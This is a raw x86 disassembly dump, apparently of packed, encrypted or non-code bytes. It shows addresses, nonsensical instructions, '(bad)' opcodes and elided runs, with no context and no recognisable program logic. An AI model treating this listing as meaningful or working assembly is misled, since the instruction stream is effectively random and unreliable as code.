  41b644:	mov    al,ds:0xc73b4403
  41b649:	push   cs
  41b64a:	mov    dh,0x95
  41b64c:	pop    ebp
  41b64d:	mov    ebp,0x2dfee043
  41b652:	pop    ds
  41b653:	inc    edx
  41b654:	cmp    BYTE PTR [ecx],cl
  41b656:	xor    DWORD PTR [edi+0x2],0x1ceb477c
  41b65d:	dec    DWORD PTR [esp+edx*8+0x1dd372af]
  41b664:	or     ah,BYTE PTR [eax+ebp*1-0x6bf62247]
  41b66b:	in     eax,dx
  41b66c:	int    0xeb
  41b66e:	arpl   WORD PTR [ecx+0x37],ax
  41b671:	outs   dx,BYTE PTR ds:[esi]
  41b672:	fimul  DWORD PTR [ebx-0x517d762c]
  41b678:	mov    ah,0x38
  41b67a:	pop    edx
  41b67b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b67c:	or     al,0xfa
  41b67e:	pop    esi
  41b67f:	xor    bh,ah
  41b681:	inc    esi
  41b682:	jge    0x41b6dc
  41b684:	daa    
  41b685:	fwait
  41b686:	loopne 0x41b6ce
  41b688:	mov    edx,0xb06d1af2
  41b68d:	cs sbb ah,ch
  41b690:	sub    eax,0x0
	...
  41b6f1:	add    BYTE PTR [eax],al
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	int3   
  41b701:	sbb    eax,DWORD PTR [ebp+0x1236c97]
  41b707:	add    BYTE PTR ds:0xa8000001,al
  41b70d:	sbb    DWORD PTR [ebx],ecx
  41b70f:	mov    edx,ecx
  41b711:	xchg   WORD PTR [edx],bx
  41b714:	retf   0x4541
  41b717:	add    eax,0xbca4bfcf
  41b71c:	mov    edi,0xb8ca7eb6
  41b721:	push   0x3cf87098
  41b726:	jae    0x41b77b
  41b728:	mov    ds:0x1634b1bd,al
  41b72d:	imul   esp,ebx,0x69
  41b730:	mov    WORD PTR [ebp-0x1662e8de],ds
  41b736:	dec    ecx
  41b737:	popf   
  41b738:	hlt    
  41b739:	and    ah,BYTE PTR [ecx+0x7f]
  41b73c:	jae    0x41b6ce
  41b73e:	mov    ecx,0xc4930615
  41b743:	adc    cl,BYTE PTR [edi]
  41b745:	pop    ds
  41b746:	push   esi
  41b747:	cmp    bh,dl
  41b749:	push   edi
  41b74a:	mov    al,0xd1
  41b74c:	(bad)  
  41b74d:	fiadd  WORD PTR [esi-0x34b00d9e]
  41b753:	and    eax,0xeaf54771
  41b758:	lods   al,BYTE PTR ds:[esi]
  41b759:	sbb    eax,0xb2f2325e
  41b75e:	cmp    DWORD PTR [ecx+0x78fdb760],edx
  41b764:	inc    BYTE PTR [edi-0x79]
  41b767:	(bad)  
  41b768:	pop    esp
  41b769:	enter  0xe56b,0x2c
  41b76d:	loope  0x41b74a
  41b76f:	ja     0x41b70a
  41b771:	mov    WORD PTR [ebp+0x63dbe702],ss
  41b777:	jp     0x41b749
  41b779:	scas   eax,DWORD PTR es:[edi]
  41b77a:	fidiv  WORD PTR [edi-0x7e]
  41b77d:	sar    DWORD PTR [esi-0x564327a7],0x11
  41b784:	sahf   
  41b785:	xchg   esp,eax
  41b786:	bt     DWORD PTR [ebx],ebp
  41b789:	in     eax,0xfe
  41b78b:	outs   dx,DWORD PTR ds:[esi]
  41b78c:	mov    esi,0x841b8c28
  41b791:	sbb    al,bh
  41b793:	jb     0x41b778
  41b795:	mov    eax,ds:0xba18b542
  41b79a:	jb     0x41b7dd
  41b79c:	cdq    
  41b79d:	cld    
  41b79e:	call   0x831ba6f7
  41b7a3:	ins    DWORD PTR es:[edi],dx
  41b7a4:	jno    0x41b797
  41b7a6:	mov    cl,dh
  41b7a8:	push   0xb3b74f5b
  41b7ad:	ficomp WORD PTR ds:0x5b648cae
  41b7b3:	aas    
  41b7b4:	sbb    DWORD PTR [ebx*1-0x7d815e3b],eax
  41b7bb:	data16 add BYTE PTR [edx+0x12bc96ea],0x7f
  41b7c3:	cli    
  41b7c4:	pop    ebx
  41b7c5:	sub    al,0x5
  41b7c7:	fstp   QWORD PTR [ebx+0x2e]
  41b7ca:	pmaddwd mm2,mm5
  41b7cd:	push   esi
  41b7ce:	jge    0x41b7c8
  41b7d0:	retf   
  41b7d1:	push   ebp
  41b7d2:	fcomp  DWORD PTR [eax]
  41b7d4:	js     0x41b7fd
  41b7d6:	in     eax,0xf7
  41b7d8:	es mov eax,0x53df20bf
  41b7de:	stos   BYTE PTR es:[edi],al
  41b7df:	imul   ebx,DWORD PTR [edi+0x52],0xb3569019
  41b7e6:	inc    eax
  41b7e7:	sti    
  41b7e8:	dec    eax
  41b7e9:	add    ebp,DWORD PTR [edx+0x5e]
  41b7ec:	repnz xchg esi,eax
  41b7ee:	dec    ebp
  41b7ef:	push   ebp
  41b7f0:	sbb    al,0xa3
  41b7f2:	neg    BYTE PTR [edi]
  41b7f4:	inc    eax
  41b7f5:	or     esp,DWORD PTR fs:[edx]
  41b7f8:	mov    dh,0xcb
  41b7fa:	fistp  WORD PTR [ecx+edx*2]
  41b7fd:	mov    ah,0xa3
  41b7ff:	cdq    
  41b800:	sbb    eax,0xf4edd748
  41b805:	pop    ecx
  41b806:	xchg   ebp,eax
  41b807:	cmp    al,0x8
  41b809:	cmp    edx,DWORD PTR [edx-0x49ab1bad]
  41b80f:	jg     0x41b7c9
	...
  41b871:	add    BYTE PTR [eax],al
  41b873:	add    BYTE PTR [edx-0x8b13804],cl
  41b879:	jg     0x41b806
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xe7
  41b881:	sub    ah,BYTE PTR [eax+0x52]
  41b884:	jno    0x41b8aa
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    eax,0x48000001
  41b88d:	out    dx,al
  41b88e:	mov    esp,0x531b8971
  41b893:	cld    
  41b894:	into   
  41b895:	pushf  
  41b896:	jg     0x41b8ea
  41b898:	ds mov eax,0xf4265162
  41b89e:	cmp    BYTE PTR [esi-0x53],dh
  41b8a1:	cmovl  esi,DWORD PTR [eax]
  41b8a4:	or     BYTE PTR [ebx+0x38],0xb8
  41b8a8:	xlat   BYTE PTR ds:[ebx]
  41b8a9:	or     cl,BYTE PTR [eax+0x35]
  41b8ac:	daa    
  41b8ad:	jge    0x41b851
  41b8af:	jl     0x41b85a
  41b8b1:	in     eax,dx
  41b8b2:	ins    DWORD PTR es:[edi],dx
  41b8b3:	adc    cl,BYTE PTR [ebx-0xa]
  41b8b6:	pop    ecx
  41b8b7:	pop    es
  41b8b8:	dec    ebp
  41b8b9:	dec    esp
  41b8ba:	xlat   BYTE PTR ds:[ebx]
  41b8bb:	xchg   esp,eax
  41b8bc:	repnz inc ebp
  41b8be:	das    
  41b8bf:	dec    ebx
  41b8c0:	push   ebx
  41b8c1:	scas   al,BYTE PTR es:[edi]
  41b8c2:	scas   al,BYTE PTR es:[edi]
  41b8c3:	js     0x41b913
  41b8c5:	int3   
  41b8c6:	inc    ebp
  41b8c7:	xor    eax,0xf2cca546
  41b8cc:	fidiv  WORD PTR [ecx+0x492adc3]
  41b8d2:	add    DWORD PTR [edx+0x2d1bf161],0x14
  41b8d9:	outs   dx,BYTE PTR ds:[esi]
  41b8da:	fsub   QWORD PTR [edi-0x7e]
  41b8dd:	lahf   
  41b8de:	(bad)  
  41b8df:	daa    
  41b8e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8e1:	jmp    0xe6b5ab77
  41b8e6:	dec    eax
  41b8e7:	mov    ebx,0x13bd54f6
  41b8ec:	mov    BYTE PTR [eax+0x26],dh
  41b8ef:	inc    ecx
  41b8f0:	neg    DWORD PTR [esi-0x2d08079e]
  41b8f6:	call   0xb2a4:0x7f8bde69
  41b8fd:	hlt    
  41b8fe:	mov    esi,DWORD PTR [eax-0xb]
  41b901:	ins    DWORD PTR es:[edi],dx
  41b902:	in     al,dx
  41b903:	pop    esi
  41b904:	add    DWORD PTR [esi],0xe68a4ade
  41b90a:	outs   dx,DWORD PTR ds:[esi]
  41b90b:	dec    edi
  41b90c:	lea    edx,[esi-0x48]
  41b90f:	out    dx,eax
  41b910:	push   ebx
  41b911:	fmul   DWORD PTR ds:0xadca6575
  41b917:	das    
  41b918:	push   ebp
  41b919:	mov    bl,0xa6
  41b91b:	test   BYTE PTR [ecx-0x10fe41b],cl
  41b921:	xchg   DWORD PTR [ecx+edi*4],esi
  41b924:	cmp    eax,0x1e
  41b927:	mov    al,0x12
  41b929:	xchg   DWORD PTR [ebx],eax
  41b92b:	stos   BYTE PTR es:[edi],al
  41b92c:	push   esp
  41b92d:	mov    eax,0x74461c89
  41b932:	jl     0x41b8d1
  41b934:	sbb    ebp,esi
  41b936:	adc    eax,0x3fa55d2f
  41b93b:	ss mov ah,0x97
  41b93e:	repnz add eax,0xa4259a
  41b944:	pop    esp
  41b945:	stos   DWORD PTR es:[edi],eax
  41b946:	adc    BYTE PTR [edi+eiz*2],al
  41b949:	cld    
  41b94a:	xor    DWORD PTR [bx],ebx
  41b94d:	rcr    DWORD PTR [ecx],1
  41b94f:	jmp    0x41b931
  41b951:	add    al,BYTE PTR [ebp+0x61]
  41b954:	mov    ch,0xb9
  41b956:	adc    eax,0x3de00f8b
  41b95b:	cmp    al,0xb7
  41b95d:	push   0xffffff88
  41b95f:	xchg   DWORD PTR [eax+0x69fdb350],ecx
  41b965:	pop    ebx
  41b966:	or     eax,0x9b8ef61e
  41b96b:	fimul  DWORD PTR [edx+ebx*8]
  41b96e:	and    BYTE PTR [esi],0x47
  41b971:	xchg   edx,eax
  41b972:	sbb    al,0xd6
  41b974:	div    DWORD PTR [ebx+0x45]
  41b977:	ds repnz mov ecx,ecx
  41b97b:	xlat   BYTE PTR ds:[ebx]
  41b97c:	jo     0x41b910
  41b97e:	out    0xe7,al
  41b980:	in     eax,0xb1
  41b982:	nop
  41b983:	mov    dl,0x5d
  41b985:	inc    edx
  41b986:	mov    WORD PTR [edx+ecx*1+0x1f52b654],gs
  41b98d:	popf   
  41b98e:	xlat   BYTE PTR ds:[ebx]
  41b98f:	push   0x85
	...
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	mov    ?,WORD PTR [edx+0x257685ee]
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    eax,0xcf000001
  41ba0d:	adc    al,0x90
  41ba0f:	jg     0x41b9fa
  41ba11:	push   ss
  41ba12:	test   BYTE PTR [esi+0x70],ch
  41ba15:	cli    
  41ba16:	pop    es
  41ba17:	dec    ebp
  41ba18:	push   edx
  41ba19:	mov    ch,0xac
  41ba1b:	inc    edi
  41ba1c:	lahf   
  41ba1d:	push   edx
  41ba1e:	jmp    0x41b9d5
  41ba20:	(bad)  
  41ba22:	mov    esi,0x7e8b5a5e
  41ba27:	cmp    ebp,esi
  41ba29:	xor    esi,ebx
  41ba2b:	mov    esp,0x59dc1e14
  41ba30:	and    esi,0x7731b2de
  41ba36:	jns    0x41ba99
  41ba38:	xchg   ah,ah
  41ba3a:	nop
  41ba3b:	fidivr WORD PTR [esi+0x34]
  41ba3e:	outs   dx,BYTE PTR ds:[esi]
  41ba3f:	ret    0xae35
  41ba42:	xor    al,0xcf
  41ba44:	iret   
  41ba45:	inc    ecx
  41ba46:	jmp    0x8956:0x73a82a2b
  41ba4d:	mov    ebp,0xd6b5f0ea
  41ba52:	mov    edx,fs
  41ba54:	adc    BYTE PTR [esi+edx*1+0x4a],bh
  41ba58:	retf   
  41ba59:	jmp    0x41b9e3
  41ba5b:	pop    eax
  41ba5c:	out    0xb2,eax
  41ba5e:	jne    0x41ba53
  41ba60:	xchg   dl,ah
  41ba62:	mov    cl,0xe
  41ba64:	(bad)  [ebx]
  41ba66:	sub    ebx,esi
  41ba68:	enter  0xd8fc,0x22
  41ba6c:	sti    
  41ba6d:	stos   DWORD PTR es:[edi],eax
  41ba6e:	xor    bh,BYTE PTR [ecx+edi*1]
  41ba71:	mov    edx,0x2aa66377
  41ba76:	dec    esp
  41ba77:	dec    ebx
  41ba78:	call   0xe3c2:0x3156
  41ba7e:	sbb    ebx,ecx
  41ba80:	xchg   edi,eax
  41ba81:	mov    ds:0xcbf7aafc,eax
  41ba86:	stc    
  41ba87:	sbb    esp,ebp
  41ba89:	jle    0x41ba47
  41ba8b:	mov    bh,0xcc
  41ba8d:	jg     0x41bb0a
  41ba8f:	outs   dx,BYTE PTR ds:[esi]
  41ba90:	cmp    al,0x0
  41ba92:	lods   eax,DWORD PTR ds:[esi]
  41ba93:	lahf   
  41ba94:	mov    ebx,0x71ce848d
  41ba99:	xor    al,0xed
  41ba9b:	fcmovnu st,st(2)
  41ba9d:	xchg   BYTE PTR [ebp-0x4e],dh
  41baa0:	bound  ebx,QWORD PTR [ebx+0x10]
  41baa3:	adc    al,0xc0
  41baa5:	xlat   BYTE PTR ds:[ebx]
  41baa6:	fisttp DWORD PTR [esi-0x5c]
  41baa9:	dec    ebx
  41baaa:	jnp    0x41ba84
  41baac:	in     al,dx
  41baad:	lods   eax,DWORD PTR ds:[esi]
  41baae:	jb     0x41bb1c
  41bab0:	sub    edi,edi
  41bab2:	pushf  
  41bab3:	inc    edx
  41bab4:	imul   edx,DWORD PTR [eax+0x46ceca91],0x45bc7324
  41babe:	mov    dl,0x14
  41bac0:	bound  eax,QWORD PTR [eax]
  41bac2:	jp     0x41baae
  41bac4:	in     al,dx
  41bac5:	lds    edx,FWORD PTR [edi]
  41bac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bac8:	mov    eax,ds:0xc171dc46
  41bacd:	shl    DWORD PTR [edi+0x7fc8357b],cl
  41bad3:	fisub  DWORD PTR [eax+0x4]
  41bad6:	or     eax,esi
  41bad8:	leave  
  41bad9:	lahf   
  41bada:	sahf   
  41badb:	mov    ah,0x10
  41badd:	call   0xab71965d
  41bae2:	mov    BYTE PTR [ecx+eax*8+0x1d],al
  41bae6:	pop    ds
  41bae7:	out    0xaf,eax
  41bae9:	add    DWORD PTR [ebp+0x1afab380],ecx
  41baef:	test   al,0x15
  41baf1:	stc    
  41baf2:	xor    BYTE PTR [eax-0xc1491c2],bl
  41baf8:	jnp    0x41ba99
  41bafa:	(bad)  
  41bafc:	add    esi,ebx
  41bafe:	fsubrp st(5),st
  41bb00:	ja     0x41bb76
  41bb02:	cwde   
  41bb03:	arpl   cx,ax
  41bb05:	mov    ebp,0xdf6e35e5
  41bb0a:	out    0x76,eax
  41bb0c:	fxch   st(7)
  41bb0e:	jbe    0x41bb20
  41bb10:	js     0x41bb12
	...
  41bb72:	add    BYTE PTR [eax],al
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x57],cx
  41bb81:	jo     0x41bbee
  41bb83:	sub    edi,DWORD PTR [ebx+0x26]
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    eax,0x66000001
  41bb8d:	repz cmp ebx,DWORD PTR [ebp+ebx*2-0x5c7ebae3]
  41bb95:	mov    edx,0xdc2cbab9
  41bb9a:	sti    
  41bb9b:	dec    edx
  41bb9c:	dec    eax
  41bb9d:	or     eax,0x69617fd4
  41bba2:	mov    ds:0x3dc8df53,eax
  41bba7:	addr16 pusha 
  41bba9:	pusha  
  41bbaa:	enter  0xeb62,0x2c
  41bbae:	stos   DWORD PTR es:[edi],eax
  41bbaf:	out    0x7f,eax
  41bbb1:	cli    
  41bbb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbb3:	inc    edx
  41bbb4:	mov    esi,0x94130240
  41bbb9:	or     BYTE PTR [ecx],ch
  41bbbb:	inc    esp
  41bbbc:	push   ebp
  41bbbd:	jbe    0x41bb7c
  41bbbf:	in     al,0x25
  41bbc1:	xchg   ebx,eax
  41bbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbc3:	cwde   
  41bbc4:	shl    BYTE PTR [ebx+0x15],0xcf
  41bbc8:	int    0xb9
  41bbca:	retf   
  41bbcb:	xchg   esi,eax
  41bbcc:	cld    
  41bbcd:	and    BYTE PTR [eax+0x4b],bh
  41bbd0:	or     DWORD PTR [esi],edx
  41bbd2:	mov    ebx,0x493abd7
  41bbd7:	scas   al,BYTE PTR es:[edi]
  41bbd8:	and    eax,0x4df09299
  41bbdd:	xlat   BYTE PTR ds:[ebx]
  41bbde:	push   esp
  41bbdf:	xchg   cl,dl
  41bbe1:	jne    0x41bb6c
  41bbe3:	add    al,0x55
  41bbe5:	xor    BYTE PTR [edi],al
  41bbe7:	xchg   esi,eax
  41bbe8:	add    BYTE PTR [eax+eiz*4],dh
  41bbeb:	stc    
  41bbec:	mov    al,ds:0x9a61f213
  41bbf1:	popf   
  41bbf2:	and    BYTE PTR [esi],ch
  41bbf4:	int    0x8b
  41bbf6:	inc    esp
  41bbf7:	(bad)  
  41bbf8:	mov    eax,ds:0x702e4946
  41bbfd:	adc    ecx,esi
  41bbff:	fistp  DWORD PTR [ecx]
  41bc01:	ss jmp 0x41bc0c
  41bc04:	cmp    bl,BYTE PTR [ecx]
  41bc06:	fldenv [esp+eiz*2]
  41bc09:	(bad)  
  41bc0a:	arpl   WORD PTR [ebx+edi*2-0x6dcc3514],bx
  41bc11:	jns    0x41bbdf
  41bc13:	mov    ecx,esi
  41bc15:	adc    eax,0xc2799133
  41bc1a:	rcl    DWORD PTR [ebx-0x5c0ac074],cl
  41bc20:	sar    DWORD PTR [edx-0x2],1
  41bc23:	jno    0x41bc4c
  41bc25:	fwait
  41bc26:	xor    cl,BYTE PTR [eax+0x45]
  41bc29:	cmp    edi,DWORD PTR [ecx+ecx*1]
  41bc2c:	add    DWORD PTR [edx+ebx*2-0x4a],edi
  41bc30:	mov    dl,0x42
  41bc32:	mov    WORD PTR [edx-0x23dfa5ff],es
  41bc38:	dec    eax
  41bc39:	(bad)  
  41bc3a:	mov    ch,0x73
  41bc3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc3d:	cmp    al,0x7d
  41bc3f:	nop
  41bc40:	mov    esp,0xc6246407
  41bc45:	cmp    DWORD PTR ds:0x3dbc3532,edx
  41bc4b:	shl    cl,cl
  41bc4d:	mov    al,ch
  41bc4f:	fldcw  WORD PTR [ecx-0x93b367]
  41bc55:	lds    edx,FWORD PTR [edi]
  41bc57:	mov    dh,dl
  41bc59:	fistp  DWORD PTR [ecx-0x1a]
  41bc5c:	inc    esp
  41bc5d:	or     eax,0xdce876a7
  41bc62:	push   es
  41bc63:	mov    bh,0xdc
  41bc65:	scas   eax,DWORD PTR es:[edi]
  41bc66:	push   edx
  41bc67:	cdq    
  41bc68:	sti    
  41bc69:	mov    ebx,0x77f498f8
  41bc6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc6f:	popa   
  41bc70:	hlt    
  41bc71:	push   edi
  41bc72:	inc    ebp
  41bc73:	sub    al,0x1d
  41bc75:	cmp    al,0x25
  41bc77:	xor    al,0xa3
  41bc79:	jbe    0x41bc07
  41bc7b:	xor    edx,DWORD PTR [ebp+ebp*4-0x3f]
  41bc7f:	ds push ds
  41bc81:	arpl   WORD PTR [edx-0x3b],dx
  41bc84:	pop    edi
  41bc85:	aad    0xd3
  41bc87:	pushf  
  41bc88:	out    dx,eax
  41bc89:	adc    DWORD PTR [ebp-0x58],0xb
  41bc8d:	call   0x0:0xee6793
	...
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xd24fd9d8
  41bd02:	mov    eax,0x1278047
  41bd07:	add    BYTE PTR ds:0x6a000001,al
  41bd0d:	cmp    BYTE PTR [edi+edx*4-0xb],bl
  41bd11:	out    dx,al
  41bd12:	pop    ecx
  41bd13:	out    dx,eax
  41bd14:	cmp    BYTE PTR [edi+0x59950114],cl
  41bd1a:	fst    QWORD PTR [ebp+0x374a06b6]
  41bd20:	imul   esi,DWORD PTR [eax],0x7a
  41bd23:	jb     0x41bd64
  41bd25:	cmp    eax,0x6fe8934b
  41bd2a:	cld    
  41bd2b:	hlt    
  41bd2c:	std    
  41bd2d:	(bad)  
  41bd2e:	ret    
  41bd2f:	out    dx,al
  41bd30:	mov    DWORD PTR [ecx],0x3c5a724e
  41bd36:	sbb    bh,BYTE PTR [edx+0x51]
  41bd39:	imul   edx,DWORD PTR [ebx+0x55624238],0xffffffa7
  41bd40:	fiadd  DWORD PTR [esi]
  41bd42:	sub    edi,DWORD PTR [ecx]
  41bd44:	rol    BYTE PTR [ebp*1-0x71fa3375],1
  41bd4b:	add    BYTE PTR [ecx],cl
  41bd4d:	mov    esi,0x30e31310
  41bd52:	ret    
  41bd53:	in     al,dx
  41bd54:	jb     0x41bd8d
  41bd56:	loop   0x41bd9b
  41bd58:	xor    ecx,DWORD PTR [edi-0x28beb0d1]
  41bd5e:	xor    ch,BYTE PTR [ecx-0x16]
  41bd61:	mov    eax,ds:0xf566164f
  41bd66:	xor    edi,esp
  41bd68:	jle    0x41bd6f
  41bd6a:	in     al,dx
  41bd6b:	retf   0xb46e
  41bd6e:	mov    edx,0x2b620bf0
  41bd73:	pop    ebp
  41bd74:	cmp    eax,0x2737b537
  41bd79:	enter  0xf028,0x6a
  41bd7d:	into   
  41bd7e:	in     al,dx
  41bd7f:	adc    eax,0xa837ebef
  41bd84:	aad    0x8c
  41bd86:	or     ah,cl
  41bd88:	xchg   ecx,eax
  41bd89:	jnp    0x41bd30
  41bd8b:	into   
  41bd8c:	and    al,dl
  41bd8e:	repz dec esp
  41bd90:	mov    edi,0x957b0faa
  41bd95:	mov    esi,0xe8f20015
  41bd9a:	pop    ecx
  41bd9b:	cmc    
  41bd9c:	sbb    cl,cl
  41bd9e:	sbb    DWORD PTR [edx],eax
  41bda0:	ja     0x41bda3
  41bda2:	or     eax,0x4f6ac223
  41bda7:	xor    al,0x8f
  41bda9:	sbb    ebx,DWORD PTR [ebp+ecx*2+0x3f]
  41bdad:	mov    esp,0xc45c0347
  41bdb2:	not    DWORD PTR [ecx-0x68dfc03e]
  41bdb8:	or     ebx,DWORD PTR [esi]
  41bdba:	icebp  
  41bdbb:	mov    esi,0xdfcb2994
  41bdc0:	or     BYTE PTR [edx-0x1b2d602c],bl
  41bdc6:	cmp    eax,0x1110a563
  41bdcb:	pop    ecx
  41bdcc:	int    0xaf
  41bdce:	mov    dl,bl
  41bdd0:	mov    ah,0x55
  41bdd2:	(bad)  
  41bdd3:	std    
  41bdd4:	mov    dl,0x97
  41bdd6:	dec    edi
  41bdd7:	sbb    DWORD PTR [ecx+0x10],ecx
  41bdda:	iret   
  41bddb:	scas   al,BYTE PTR es:[edi]
  41bddc:	adc    al,BYTE PTR [edi+eiz*4-0x40]
  41bde0:	icebp  
  41bde1:	sub    dh,BYTE PTR [ecx-0x3c1df949]
  41bde7:	or     DWORD PTR ds:0x2583cbc0,ecx
  41bded:	ficom  WORD PTR [eax]
  41bdef:	or     esp,edi
  41bdf1:	add    BYTE PTR ss:[eax],dh
  41bdf4:	stc    
  41bdf5:	sub    eax,DWORD PTR [edx+0x479489d4]
  41bdfb:	repz (bad)
  41bdfe:	adc    DWORD PTR [ecx+ebx*8+0x0],ebp
  41be02:	out    0x7b,al
  41be04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be05:	fcomp  st(4)
  41be07:	jbe    0x41bdf8
  41be09:	shl    DWORD PTR [ebx-0x10979f83],1
  41be0f:	mov    esi,0x2b
	...
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx+0x24263f66]
  41be82:	clc    
  41be83:	ja     0x41be0a
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR ds:0x5e000001,al
  41be8d:	(bad)  
  41be8e:	cmp    esi,DWORD PTR [esi-0x4a]
  41be91:	(bad)  
  41be93:	pop    es
  41be94:	xchg   ebp,eax
  41be95:	fld    DWORD PTR [ebx+0x72]
  41be98:	test   eax,0x59fea351
  41be9d:	dec    esi
  41be9e:	scas   eax,DWORD PTR es:[edi]
  41be9f:	cld    
  41bea0:	and    al,0xe4
  41bea2:	nop
  41bea3:	mov    ecx,0x512a4c0e
  41bea8:	and    dl,bh
  41beaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41beab:	jae    0x41bec5
  41bead:	jecxz  0x41be48
  41beaf:	pop    eax
  41beb0:	jmp    0x669a:0x3ab49121
  41beb7:	mov    al,ds:0xd0580718
  41bebc:	sahf   
  41bebd:	or     ebx,edi
  41bebf:	pop    ebp
  41bec0:	test   BYTE PTR [esp+esi*4+0x1e],bl
  41bec4:	in     eax,dx
  41bec5:	cwde   
  41bec6:	(bad)  
  41bec7:	cmp    DWORD PTR [edx-0x39a24f74],esp
  41becd:	adc    eax,0x52738f10
  41bed2:	lods   al,BYTE PTR ds:[esi]
  41bed3:	push   ebx
  41bed4:	push   ebp
  41bed5:	cmc    
  41bed6:	leave  
  41bed7:	mov    cl,0x6a
  41bed9:	cmp    DWORD PTR [esi+0x6e539f55],ebx
  41bedf:	xchg   ebp,eax
  41bee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bee1:	mov    edi,0xf0aba304
  41bee6:	loopne 0x41be6c
  41bee8:	dec    ecx
  41bee9:	sub    BYTE PTR [eax],dl
  41beeb:	adc    DWORD PTR [edx-0x573a9b41],esi
  41bef1:	mov    ebx,eax
  41bef3:	sbb    eax,0x78de781f
  41bef8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bef9:	pop    eax
  41befa:	outs   dx,DWORD PTR ds:[esi]
  41befb:	bound  ecx,QWORD PTR [edx+ebp*4]
  41befe:	add    cl,BYTE PTR ds:[eax-0x1bcb94ae]
  41bf05:	and    dh,dl
  41bf07:	push   edx
  41bf08:	(bad)  
  41bf09:	leave  
  41bf0a:	xor    esi,ecx
  41bf0c:	mov    ch,0xdc
  41bf0e:	rol    DWORD PTR [edx-0x5c],1
  41bf11:	sbb    dh,BYTE PTR [edi+0x3423d426]
  41bf17:	xchg   esp,eax
  41bf18:	push   ecx
  41bf19:	mov    bh,0x29
  41bf1b:	shl    DWORD PTR [ebx+0x74],0x20
  41bf1f:	ss inc edx
  41bf21:	rol    DWORD PTR [esi],cl
  41bf23:	and    dl,BYTE PTR [ebp+0x5c]
  41bf26:	cdq    
  41bf27:	mov    eax,ds:0xbd70552c
  41bf2c:	std    
  41bf2d:	or     eax,0xf00e7fcb
  41bf32:	push   ds
  41bf33:	push   es
  41bf34:	ds jl  0x41bf81
  41bf37:	sbb    ch,BYTE PTR ds:0xafb42af2
  41bf3d:	and    BYTE PTR [eax],al
  41bf3f:	fs pop ebx
  41bf41:	jne    0x41bf0b
  41bf43:	cli    
  41bf44:	push   edx
  41bf45:	mov    ebp,0x5382cf7c
  41bf4a:	xchg   edi,eax
  41bf4b:	or     edi,esi
  41bf4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf4e:	jne    0x41bf9a
  41bf50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf51:	rcr    eax,0x6
  41bf54:	cs sub eax,0xb2859670
  41bf5a:	cli    
  41bf5b:	sub    ebx,DWORD PTR [edx+0x16]
  41bf5e:	cli    
  41bf5f:	mov    esp,?
  41bf61:	dec    edx
  41bf62:	and    BYTE PTR [eax+0x4c0b3801],dh
  41bf68:	sahf   
  41bf69:	(bad)  [esi]
  41bf6b:	js     0x41bfa0
  41bf6d:	pop    edi
  41bf6e:	jecxz  0x41bf56
  41bf70:	stos   DWORD PTR es:[edi],eax
  41bf71:	ins    DWORD PTR es:[edi],dx
  41bf72:	outs   dx,BYTE PTR ds:[esi]
  41bf73:	mov    edi,0x556a1956
  41bf78:	in     al,0x25
  41bf7a:	fmulp  st(1),st
  41bf7c:	xchg   esp,eax
  41bf7d:	push   esi
  41bf7e:	lods   al,BYTE PTR ds:[esi]
  41bf7f:	pop    ss
  41bf80:	lods   eax,DWORD PTR ds:[esi]
  41bf81:	retf   0x15a6
  41bf84:	loopne 0x41bf91
  41bf86:	aad    0xac
  41bf88:	mov    ds:0x963c2ff7,eax
  41bf8d:	push   cs
  41bf8e:	std    
  41bf8f:	lahf   
  41bf90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	retf   
  41c001:	xor    al,BYTE PTR [ebp+0x1298add]
  41c007:	add    BYTE PTR ds:0x5000001,al
  41c00d:	ins    BYTE PTR es:[edi],dx
  41c00e:	jge    0x41c054
  41c010:	inc    eax
  41c011:	mov    edx,0x84e1458
  41c016:	dec    ebp
  41c017:	mov    esp,0x89d44b6a
  41c01c:	push   es
  41c01d:	scas   eax,DWORD PTR es:[edi]
  41c01e:	loope  0x41c07b
  41c020:	cmp    al,0x5f
  41c022:	(bad)  
  41c023:	jns    0x41bfeb
  41c025:	pusha  
  41c026:	mov    ebx,0x9573af82
  41c02b:	add    BYTE PTR [ebx],0x8d
  41c02e:	shl    DWORD PTR [ebx+0x2],cl
  41c031:	hlt    
